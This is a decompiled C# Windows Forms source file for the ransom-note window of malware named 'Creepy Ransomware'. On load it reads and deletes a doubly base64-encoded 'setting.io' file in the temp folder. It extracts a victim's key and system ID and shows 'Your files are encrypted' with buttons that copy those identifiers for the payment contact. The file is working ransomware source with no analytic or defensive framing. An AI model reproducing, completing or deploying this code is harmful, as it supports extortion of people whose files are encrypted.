using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Show_GUI.Properties;

namespace Show_GUI;

public class encryptedfiles : Form
{
	private IContainer components;

	private PictureBox pictureBox1;

	private Panel panel1;

	private Panel panel2;

	private Label label2;

	private Label label1;

	private Panel panel3;

	private Label label3;

	private Panel panel4;

	private Button button2;

	private Button button1;

	private Panel panel5;

	private Label mailstext;

	public string crpkey { get; set; }

	public string victimsystemid { get; set; }

	public encryptedfiles()
	{
		InitializeComponent();
	}

	public string base64decode(string data)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(data));
	}

	private void encryptedfiles_Load(object sender, EventArgs e)
	{
		try
		{
			string text3 = (crpkey = (victimsystemid = ""));
			string text4 = Path.GetTempPath() + "setting.io";
			if (File.Exists(text4))
			{
				new FileInfo(text4).Attributes = FileAttributes.Normal;
				string data = File.ReadAllText(text4);
				try
				{
					File.Delete("setting.io");
				}
				catch
				{
				}
				data = base64decode(data);
				data = base64decode(data);
				crpkey = data.Split(new char[1] { ':' })[0];
				victimsystemid = data.Split(new char[1] { ':' })[1];
				((Control)mailstext).set_Text(data.Split(new char[1] { ':' })[2].Replace("|", Environment.NewLine));
			}
		}
		catch
		{
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		try
		{
			Clipboard.SetText(crpkey);
		}
		catch
		{
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clipboard.SetText(victimsystemid);
		}
		catch
		{
		}
		MessageBox.Show("Your system key copied");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_01dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e6: Expected O, but got Unknown
		//IL_0630: Unknown result type (might be due to invalid IL or missing references)
		//IL_063a: Expected O, but got Unknown
		//IL_06f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06fa: Expected O, but got Unknown
		//IL_076e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0778: Expected O, but got Unknown
		//IL_080e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0818: Expected O, but got Unknown
		//IL_08ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f9: Expected O, but got Unknown
		//IL_0902: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(encryptedfiles));
		pictureBox1 = new PictureBox();
		panel1 = new Panel();
		panel4 = new Panel();
		button2 = new Button();
		button1 = new Button();
		panel5 = new Panel();
		mailstext = new Label();
		panel3 = new Panel();
		label3 = new Label();
		panel2 = new Panel();
		label2 = new Label();
		label1 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel1).SuspendLayout();
		((Control)panel4).SuspendLayout();
		((Control)panel5).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)pictureBox1).set_Dock((DockStyle)3);
		pictureBox1.set_Image((Image)(object)Resources.photo_2020_04_01_15_39_37);
		((Control)pictureBox1).set_Location(new Point(0, 0));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(276, 430));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(12);
		pictureBox1.set_TabStop(false);
		((ScrollableControl)panel1).set_AutoScroll(true);
		panel1.set_AutoSizeMode((AutoSizeMode)0);
		((Control)panel1).get_Controls().Add((Control)(object)panel4);
		((Control)panel1).get_Controls().Add((Control)(object)panel5);
		((Control)panel1).get_Controls().Add((Control)(object)panel3);
		((Control)panel1).get_Controls().Add((Control)(object)panel2);
		((Control)panel1).set_Font(new Font("Microsoft Sans Serif", 12.5f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)panel1).set_ForeColor(Color.White);
		((Control)panel1).set_Location(new Point(276, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(644, 430));
		((Control)panel1).set_TabIndex(15);
		((Control)panel4).get_Controls().Add((Control)(object)button2);
		((Control)panel4).get_Controls().Add((Control)(object)button1);
		((Control)panel4).set_Dock((DockStyle)1);
		((Control)panel4).set_Location(new Point(0, 435));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(627, 69));
		((Control)panel4).set_TabIndex(7);
		((Control)button2).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button2).get_FlatAppearance().set_BorderColor(SystemColors.MenuText);
		((ButtonBase)button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button2).get_FlatAppearance().set_CheckedBackColor(SystemColors.MenuText);
		((ButtonBase)button2).get_FlatAppearance().set_MouseDownBackColor(SystemColors.MenuText);
		((ButtonBase)button2).get_FlatAppearance().set_MouseOverBackColor(SystemColors.MenuText);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_ForeColor(Color.Yellow);
		((Control)button2).set_Location(new Point(316, 10));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(257, 48));
		((Control)button2).set_TabIndex(1);
		((Control)button2).set_Text("Copy CRPKey");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).get_FlatAppearance().set_BorderColor(SystemColors.MenuText);
		((ButtonBase)button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button1).get_FlatAppearance().set_CheckedBackColor(SystemColors.MenuText);
		((ButtonBase)button1).get_FlatAppearance().set_MouseDownBackColor(SystemColors.MenuText);
		((ButtonBase)button1).get_FlatAppearance().set_MouseOverBackColor(SystemColors.MenuText);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_ForeColor(Color.Yellow);
		((Control)button1).set_Location(new Point(53, 10));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(257, 48));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Copy system key");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)panel5).get_Controls().Add((Control)(object)mailstext);
		((Control)panel5).set_Dock((DockStyle)1);
		((Control)panel5).set_Location(new Point(0, 374));
		((Control)panel5).set_Name("panel5");
		((Control)panel5).set_Size(new Size(627, 61));
		((Control)panel5).set_TabIndex(6);
		((Control)mailstext).set_Dock((DockStyle)5);
		((Control)mailstext).set_Location(new Point(0, 0));
		((Control)mailstext).set_Name("mailstext");
		((Control)mailstext).set_Size(new Size(627, 61));
		((Control)mailstext).set_TabIndex(0);
		mailstext.set_TextAlign((ContentAlignment)32);
		((Control)panel3).get_Controls().Add((Control)(object)label3);
		((Control)panel3).set_Dock((DockStyle)1);
		((Control)panel3).set_Location(new Point(0, 53));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(627, 321));
		((Control)panel3).set_TabIndex(1);
		((Control)label3).set_Dock((DockStyle)5);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 12.5f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(0, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(627, 321));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		label3.set_TextAlign((ContentAlignment)32);
		((Control)panel2).get_Controls().Add((Control)(object)label2);
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_Dock((DockStyle)1);
		((Control)panel2).set_Font(new Font("Microsoft Sans Serif", 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)panel2).set_ForeColor(Color.White);
		((Control)panel2).set_Location(new Point(0, 0));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(627, 53));
		((Control)panel2).set_TabIndex(0);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Yellow);
		((Control)label2).set_Location(new Point(335, 14));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(195, 25));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Creepy Ransomware");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(97, 14));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(247, 25));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Your files are encrypted by ");
		label1.set_TextAlign((ContentAlignment)32);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(920, 430));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(4));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("encryptedfiles");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Creepy Ransomware");
		((Form)this).add_Load((EventHandler)encryptedfiles_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel1).ResumeLayout(false);
		((Control)panel4).ResumeLayout(false);
		((Control)panel5).ResumeLayout(false);
		((Control)panel3).ResumeLayout(false);
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
